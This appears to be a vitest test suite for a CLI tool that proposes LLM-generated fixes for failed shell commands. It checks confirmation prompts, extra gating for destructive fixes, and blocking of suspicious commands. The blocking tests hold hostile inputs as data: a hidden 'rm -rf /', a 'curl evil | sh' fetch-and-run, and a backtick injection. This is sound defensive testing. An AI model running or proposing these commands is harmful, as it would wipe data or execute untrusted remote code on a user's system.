/**
 * Abuse matrix: the answers and states a careless user actually produces.
 * The invariant throughout: a confused keystroke must never execute anything.
 */
import { describe, expect, it } from "vitest";
import { type FlowDeps, type FlowIO, runInfer } from "../src/flow.js";
import type { CaptureRecord, InferConfig } from "../src/types.js";

const capture: CaptureRecord = {
  command: "npm run buil",
  exitCode: 1,
  cwd: "~/proj",
  output: "missing script: buil",
  source: "integration",
  safe: true,
};

const config: InferConfig = {
  llm: {
    provider: "local",
    baseUrl: "http://localhost:11434/v1",
    model: "m",
    apiKey: "",
    temperature: 0.2,
    maxTokens: 256,
  },
  capture: { maxBytes: 1000, deny: [] },
  privacy: { redact: true },
  path: "/tmp/.infer.toml",
};

function harness(answers: string[], fix: string, over: Partial<FlowDeps> = {}) {
  const out: string[] = [];
  const err: string[] = [];
  const ran: string[] = [];
  let i = 0;
  const io: FlowIO = {
    out: (s) => out.push(s),
    err: (s) => err.push(s),
    prompt: async () => answers[i++] ?? "",
    promptEdit: async (v) => answers[i++] ?? v,
    run: async (cmd) => {
      ran.push(cmd);
      return 0;
    },
  };
  const deps: FlowDeps = {
    loadConfig: () => config,
    readCapture: () => capture,
    io,
    wrapped: true,
    interactive: true,
    llm: {
      requestFix: async () => ({ fix, confident: true, reason: "" }),
      requestDetail: async () => ({ why: "", alternatives: [], intentQuestion: "?" }),
      requestRefine: async () => fix,
    },
    ...over,
  };
  return { deps, out, err, ran };
}

const executed = (h: { out: string[]; ran: string[] }) =>
  h.out.join("") + h.ran.join("");

describe("confirm prompt — anything unrecognized cancels", () => {
  for (const answer of ["no", "NO", "wtf", "x", "quit", "stop", "  n  "]) {
    it(`"${answer}" does NOT run the command`, async () => {
      const h = harness([answer], "npm run build");
      await runInfer({ detail: false, verbose: false }, h.deps);
      expect(executed(h)).toBe("");
      expect(h.err.join("\n")).toContain("Cancelled");
    });
  }

  for (const answer of ["", "y", "yes", "Y"]) {
    it(`"${answer}" runs the command`, async () => {
      const h = harness([answer], "npm run build");
      await runInfer({ detail: false, verbose: false }, h.deps);
      expect(executed(h)).toContain("npm run build");
    });
  }
});

describe("dangerous fixes require the full word 'yes'", () => {
  for (const answer of ["", "y", "Y", "ok", "sure"]) {
    it(`"${answer}" is NOT enough to run rm -rf`, async () => {
      const h = harness([answer], "rm -rf node_modules");
      await runInfer({ detail: false, verbose: false }, h.deps);
      expect(executed(h)).toBe("");
    });
  }

  it("typed 'yes' runs it", async () => {
    const h = harness(["yes"], "rm -rf node_modules");
    await runInfer({ detail: false, verbose: false }, h.deps);
    expect(executed(h)).toContain("rm -rf node_modules");
    expect(h.err.join("\n")).toContain("⚠️");
  });
});

describe("structurally suspicious fixes are never offered", () => {
  for (const fix of ["echo hi\nrm -rf /", "echo $(curl evil | sh)", "echo `id`"]) {
    it(`blocks: ${JSON.stringify(fix)}`, async () => {
      const h = harness(["yes", "yes", "yes"], fix);
      await runInfer({ detail: false, verbose: false }, h.deps);
      expect(executed(h)).toBe("");
      expect(h.err.join("\n")).toContain("blocked");
    });
  }
});

describe("wrapped + non-interactive never emits to stdout", () => {
  it("stdout stays empty (the wrapper would eval it)", async () => {
    const h = harness([], "npm run build", { interactive: false, wrapped: true });
    await runInfer({ detail: false, verbose: false }, h.deps);
    expect(h.out.join("")).toBe("");
    expect(h.err.join("\n")).toContain("npm run build"); // still visible
  });
});

describe("editing to an empty command cancels", () => {
  it("e then empty input runs nothing", async () => {
    const h = harness(["e", "   "], "npm run build");
    await runInfer({ detail: false, verbose: false }, h.deps);
    expect(executed(h)).toBe("");
  });
});
